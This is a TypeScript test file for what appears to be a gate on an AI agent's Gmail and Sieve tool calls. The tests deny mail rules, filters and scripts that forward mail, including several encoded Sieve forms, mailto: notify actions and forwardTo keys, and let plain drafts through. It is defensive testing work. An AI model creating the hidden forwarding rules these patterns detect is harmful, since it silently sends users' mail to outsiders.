    expect(isPlainDraft(['manage_rules'], [null])).toBe(false)
    expect(isPlainDraft(['update_sieve_script'], ['draft'])).toBe(false)
    expect(isPlainDraft(['create_forwarding_address'], ['draft'])).toBe(false)
    // a plain draft keeps going the ledger way, a filter with a harmless description stays as before
    const known = (a: string) => a === 'known@example.com'
    expect(gateDecision('mcp__gmail__create_draft', { to: ['known@example.com'], body: 'please forward this to x@y.example' }, known)).toEqual({ deny: false })
    expect(mailToolAction('mcp__gmail__create_filter', { description: 'move newsletters to folder', action: { addLabelIds: ['X'] } })).toBe(null)
  })
})

// card 61fcac1e N1: the free-text invariant. The prose exemption belongs to a POSITIVELY identified mail
// tool (isPlainDraft: draft class, a mail noun in a segment, no rule / filter / script / settings /
// automation word); every other non-reader, non-send tool has the whole word test (forward | redirect |
// fwd, mailto:) on every string value, except the inert keys (label / folder, selectors, auto-reply text).
// No syntax pattern: the Sieve command name cannot be encoded, so the word test closes every form.
// The matrices are generated here from the `free_text_invariant` block of the shared fixture (the 3d6e5181
// reviewer set), and the python twin gets the same strings.
type Inv = {
  sieve_tools: string[]; sieve_keys: string[]; sieve_forms: Array<{ label: string; text: string }>
  instruction_keys: string[]; instructions: Array<{ label: string; text: string; denied: boolean }>
  rule_like_names: string[]; rule_like_inputs: Array<{ label: string; input: unknown }>
  plain_names: string[]; plain_segments: string[]; not_plain_segments: string[]
  deny: Array<{ tool: string; input: unknown; note: string }>
  allow: Array<{ tool: string; input: unknown; expected: 'draft' | null; note: string }>
}
const INV = (JSON.parse(readFileSync(join(EXTRACT_DIR, 'mail-tool-action-cases.json'), 'utf-8')) as { name_independent: { free_text_invariant: Inv } }).name_independent.free_text_invariant
const KNOWN_ADDR = 'known@example.com'
const knownOnly = (a: string) => a === KNOWN_ADDR

// one python process for every call: [name, input] pairs in, {act, rule} out; [segments, classes] pairs for the plain-draft twin
function pythonVerdicts(calls: Array<[string, unknown]>): Array<{ act: string | null; rule: boolean }> {
  const out = execFileSync('python3', ['-I', '-c', `
import json, sys
sys.path.insert(0, ${JSON.stringify(EXTRACT_DIR)})
from email_extract import mail_tool_action, mail_rule_forward
print(json.dumps([{"act": mail_tool_action(n, i), "rule": mail_rule_forward(n, i)} for n, i in json.load(sys.stdin)]))
`], { encoding: 'utf-8', input: JSON.stringify(calls) })
  return JSON.parse(out.trim())
}
function pythonPlain(calls: Array<[string[], Array<string | null>]>): boolean[] {
  const out = execFileSync('python3', ['-I', '-c', `
import json, sys
sys.path.insert(0, ${JSON.stringify(EXTRACT_DIR)})
from email_extract import _is_plain_draft
print(json.dumps([_is_plain_draft(s, c) for s, c in json.load(sys.stdin)]))
`], { encoding: 'utf-8', input: JSON.stringify(calls) })
  return JSON.parse(out.trim())
}

describe('free-text invariant (card 61fcac1e): positive plain-draft exemption, whole word test for every other tool', () => {
  const T = (n: string) => n.split('__')[2]
  const denyCalls: Array<[string, unknown, string]> = []
  for (const t of INV.sieve_tools) for (const f of INV.sieve_forms) {
    for (const k of INV.sieve_keys) denyCalls.push([t, { name: 'main', [k]: f.text }, `${f.label}/${k}`])
    denyCalls.push([t, { name: 'main', content: JSON.stringify({ script: f.text }) }, `${f.label}/jsonstr`])
  }
  const nSieve = denyCalls.length
  const instrCalls: Array<[string, unknown, string, boolean]> = []
  for (const t of INV.sieve_tools) for (const k of INV.instruction_keys) for (const ins of INV.instructions) instrCalls.push([t, { [k]: ins.text }, `${ins.label}/${k}`, ins.denied])
  for (const n of INV.rule_like_names) for (const i of INV.rule_like_inputs) denyCalls.push([n, i.input, `${T(n)}/${i.label}`])
  for (const d of INV.deny) denyCalls.push([d.tool, d.input, d.note])
  const allCalls: Array<[string, unknown]> = [
    ...denyCalls.map((c): [string, unknown] => [c[0], c[1]]),
    ...instrCalls.map((c): [string, unknown] => [c[0], c[1]]),
    ...INV.allow.map((c): [string, unknown] => [c.tool, c.input]),
  ]
  const py = pythonVerdicts(allCalls)
  const pyAt = (i: number) => py[i]

  it('T1 T2 T3 T5 T7 T8: every denied call is a send and a mail-rule-forward deny, in both twins', () => {
    expect(nSieve).toBe(INV.sieve_tools.length * INV.sieve_forms.length * (INV.sieve_keys.length + 1))
    denyCalls.forEach(([tool, input, label], i) => {
      expect(mailToolAction(tool, input), `${tool} ${label}`).toBe('send')
      expect(mailRuleForwardJs(tool, input), `${tool} ${label}`).toBe(true)
      expect(gateDecision(tool, input, () => true), `${tool} ${label}`).toEqual({ deny: true, kind: 'mail-rule-forward' })
      expect(pyAt(i), `py ${tool} ${label}`).toEqual({ act: 'send', rule: true })
    })
  })

  it('T1: the six N4-B2 Sieve forms (escaped quote, text: block, :notify tag, comment, variables, encoded character) and the N4-B3 enotify mailto: are denied in every key', () => {
    const labels = new Set(denyCalls.slice(0, nSieve).map((c) => c[2].split('/')[0]))
    for (const l of ['S4_escq', 'S5_textml', 'S6_notifytag', 'S7_comment', 'S8_vars', 'S9_enc', 'S12_enotify']) expect(labels.has(l), l).toBe(true)
  })

  it('F-sentences: a forward word in a rule / script / settings description denies; the F7 sentence without one stays outside (spec AC5)', () => {
    instrCalls.forEach(([tool, input, label, denied], i) => {
      const at = denyCalls.length + i
      expect(mailRuleForwardJs(tool, input), `${tool} ${label}`).toBe(denied)
      expect(pyAt(at).rule, `py ${tool} ${label}`).toBe(denied)
      expect(pyAt(at).act, `py ${tool} ${label}`).toBe(denied ? 'send' : mailToolAction(tool, input))
    })
    expect(INV.instructions.filter((x) => !x.denied).map((x) => x.label)).toEqual(['F7_copy'])
  })

  it('T3 T4: isPlainDraft is positive in both twins (rule-like names and a draft verb with no mail noun are not plain)', () => {
    for (const s of INV.plain_segments) expect(isPlainDraft([s], ['draft']), s).toBe(true)
    for (const s of INV.not_plain_segments) expect(isPlainDraft([s], ['draft']), s).toBe(false)
    expect(isPlainDraft(['create_draft'], [null])).toBe(false) // the name classifier does not call it a draft
    const calls: Array<[string[], Array<string | null>]> = [...INV.plain_segments, ...INV.not_plain_segments].map((s) => [[s], ['draft']])
    expect(pythonPlain(calls)).toEqual([...INV.plain_segments.map(() => true), ...INV.not_plain_segments.map(() => false)])
    // a compound name is plain only when no segment is rule-like
    expect(isPlainDraft(['server', 'create_draft'], ['nonsend', 'draft'])).toBe(true)
    expect(isPlainDraft(['rules', 'create_draft'], ['nonsend', 'draft'])).toBe(false)
  })

  it('T4: a plain draft keeps its prose (a forward instruction in a body is a letter, the ledger checks the recipients)', () => {
    const body = { to: [KNOWN_ADDR], subject: 'Fwd: x', body: 'please forward this to x@y.example', html: '<a href="mailto:x@y.example">x</a>' }
    for (const n of INV.plain_names) {
      expect(mailToolAction(n, body), n).toBe('draft')
      expect(mailRuleForwardJs(n, body), n).toBe(false)
      expect(gateDecision(n, body, knownOnly).kind, n).not.toBe('mail-rule-forward')
      expect(pythonVerdicts([[n, body]])[0], `py ${n}`).toEqual({ act: 'draft', rule: false })
    }
  })

  it('T5 T6: the plain draft file keys, the inert selector / auto-reply keys and the calendar prose stay allowed, in both twins', () => {
    const base = denyCalls.length + instrCalls.length
    INV.allow.forEach((c, i) => {
      expect(mailToolAction(c.tool, c.input), c.note).toBe(c.expected)
      expect(mailRuleForwardJs(c.tool, c.input), c.note).toBe(false)
      expect(pyAt(base + i), `py ${c.note}`).toEqual({ act: c.expected, rule: false })
    })
  })

  it('T9 hasForwardKeyName strict: file keys are exempt in a plain draft only, the value words and mailto: apply to everything else', () => {
    const strict = (v: unknown) => hasForwardKeyName(v, true, true)
    const plain = (v: unknown) => hasForwardKeyName(v, true, false)
    // file keys: exempt in a plain draft, word-tested in strict mode
    for (const v of [{ attachments: [{ filename: 'fwd_invoice.pdf' }] }, { attachments: ['/tmp/Fwd_ajanlat.pdf'] }, { fileName: 'Fwd_invoice.pdf' },
      { path: 'Forwarded_invoice.pdf' }, { filePath: '/tmp/redirect.txt' }, { attachmentPaths: ['fwd.pdf'] }]) {
      expect(plain(v), JSON.stringify(v)).toBe(false)
      expect(strict(v), JSON.stringify(v)).toBe(true)
    }
    // a header value is neither prose nor a file key
    expect(plain({ headers: { 'X-Tag': 'fwd' } })).toBe(true)
    // mailto: is a forward sign in strict mode only, and not inside an exempt key
    expect(strict({ html: '<a href="mailto:a@b.hu">a</a>' })).toBe(true)
    expect(plain({ html: '<a href="mailto:a@b.hu">a</a>' })).toBe(false)
    expect(strict({ x: 'mailto:a@b.hu' })).toBe(true)
    expect(plain({ x: 'mailto:a@b.hu' })).toBe(false)
    expect(strict({ signature: 'mailto:a@b.hu', query: 'mailto:' })).toBe(false) // inert keys
    expect(strict({ path: 'mailto:a@b.hu' })).toBe(true) // a file key is exempt in a plain draft only
    // inert keys: never word-tested in either mode
    const inert = { query: 'subject:Fwd', q: 'forward', search: 'Fwd', keyword: 'redirect', keywords: ['forward'], signature: 'fwd',
      responseBodyPlainText: 'look forward', responseBodyHtml: 'forward', internalReplyMessage: 'forward', externalReplyMessage: 'redirect', autoReplyMessage: 'fwd',
      label: 'Forwarded', folder: 'Forwarded Items', mailbox: 'Forwarded' }
    expect(strict(inert)).toBe(false)
    expect(plain(inert)).toBe(false)
    // ... but a forwarding KEY is a forward in every mode, under an inert or a prose key too
    expect(strict({ query: '{"forwardTo":"x"}' })).toBe(true)
    expect(plain({ signature: { forwardTo: 'x' } })).toBe(true)
    expect(plain({ responseBodyPlainText: '{"redirectTo":"x"}' })).toBe(true)
    // the bounds still fail closed (depth, node count, a string too long to parse), in both modes
    let deep: Record<string, unknown> = { a: 1 }
    for (let i = 0; i < 40; i++) deep = { n: deep }
    for (const mode of [strict, plain]) {
      expect(mode(deep)).toBe(true)
      expect(mode({ l: Array.from({ length: 6000 }, (_, i) => i) })).toBe(true)
      expect(mode({ b: '{' + 'a'.repeat(100001) })).toBe(true)
      expect(mode('x')).toBe(true)
    }
  })

  it('AC9: hasForwardKey (the 6151bb4d rule branch) counts mailto: as a forward sign, a filter write with it is a send', () => {
    expect(hasForwardKey({ action: { notify: 'mailto:' } })).toBe(true)
    expect(hasForwardKey({ criteria: { subject: 'invoice' } })).toBe(false)
  })
})
